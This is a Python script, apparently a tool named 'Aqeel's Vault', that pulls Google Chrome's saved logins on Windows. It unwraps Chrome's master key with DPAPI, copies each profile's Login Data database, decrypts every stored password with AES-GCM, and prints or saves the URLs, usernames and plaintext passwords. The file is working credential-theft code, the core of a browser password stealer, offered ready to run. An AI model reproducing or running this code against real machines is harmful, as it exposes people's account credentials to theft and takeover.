import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import random
import pyfiglet  # Importing the pyfiglet library for ASCII art
import argparse   # Importing argparse to handle command-line arguments

# GLOBAL CONSTANTS
CHROME_USER_DATA_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
LOCAL_STATE_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))

# List of interesting phrases
interesting_phrases = [
    "The secret is out!",
    "Here's a hidden gem!",
    "Unlocking treasures...",
    "Password revealed!",
    "Your secrets are safe with me!",
    "Knowledge is power!",
    "You've got mail!",
    "Here's what you were looking for!",
    "A password a day keeps the hackers away!",
    "Ssshh... it's a secret!"
]

def retrieve_secret_key():
    try:
        with open(LOCAL_STATE_PATH, "r", encoding='utf-8') as file:
            local_data = json.loads(file.read())
        encrypted_key = base64.b64decode(local_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return secret_key
    except Exception as err:
        print(f"[ERR] Unable to retrieve Chrome secret key: {err}")
        return None
    
def decrypt_data(cipher, data):
    return cipher.decrypt(data)

def create_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_chrome_password(encrypted_data, secret_key):
    try:
        iv = encrypted_data[3:15]
        encrypted_password = encrypted_data[15:-16]
        cipher = create_cipher(secret_key, iv)
        decrypted_password = decrypt_data(cipher, encrypted_password).decode()
        return decrypted_password
    except Exception as err:
        print(f"[ERR] Decryption failed: {err}")
        return ""

def connect_to_db(chrome_login_db):
    try:
        shutil.copy2(chrome_login_db, "TempLoginVault.db")
        return sqlite3.connect("TempLoginVault.db")
    except Exception as err:
        print(f"[ERR] Unable to connect to Chrome database: {err}")
        return None

def get_chrome_passwords():
    secret_key = retrieve_secret_key()
    profile_folders = [folder for folder in os.listdir(CHROME_USER_DATA_PATH) if folder.startswith("Profile") or folder == "Default"]
    passwords = ""

    for profile in profile_folders:
        login_db_path = os.path.normpath(r"%s\%s\Login Data" % (CHROME_USER_DATA_PATH, profile))

        if os.path.exists(login_db_path):
            connection = connect_to_db(login_db_path)
            if secret_key and connection:
                cursor = connection.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for record in cursor.fetchall():
                    url, username, encrypted_password = record
                    if url and username and encrypted_password:
                        decrypted_password = decrypt_chrome_password(encrypted_password, secret_key)
                        # Randomly select an interesting phrase
                        interesting_index = random.choice(interesting_phrases)
                        passwords += f"{interesting_index}\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n{'*' * 50}\n"
                cursor.close()
                connection.close()
                os.remove("TempLoginVault.db")
            else:
                passwords += f"[ERR] Unable to retrieve passwords for profile: {profile}\n"
        else:
            passwords += f"[WARN] Login Data file not found for profile: {profile}\n"

    return passwords

def print_banner():
    # Generate ASCII art for the title
    ascii_art = pyfiglet.figlet_format("Aqeel's Vault", font="slant")
    print("\033[92m" + ascii_art + "\033[0m")  # Change color to green

def save_passwords_to_file(passwords, filename):
    """Save the retrieved passwords to a specified text file."""
    try:
        with open(filename, 'w') as file:
            file.write(passwords)
        print(f"[INFO] Passwords saved to {filename}")
    except Exception as err:
        print(f"[ERR] Unable to save passwords to file: {err}")

def main():
    parser = argparse.ArgumentParser(description="Aqeel's Vault - Retrieve and optionally save Chrome passwords.")
    parser.add_argument('--save', type=str, help="Specify a filename to save the passwords.")
    
    args = parser.parse_args()  # Parse command-line arguments
    
    print_banner()  # Display the tool's name
    print("Retrieving saved passwords from Google Chrome...\n")
    passwords = get_chrome_passwords()
    
    if passwords:
        print(passwords)
        # If the --save option is specified, save to the given file
        if args.save:
            save_passwords_to_file(passwords, args.save)
    else:
        print("[INFO] No passwords found or unable to retrieve passwords.")

if __name__ == "__main__":
    main()
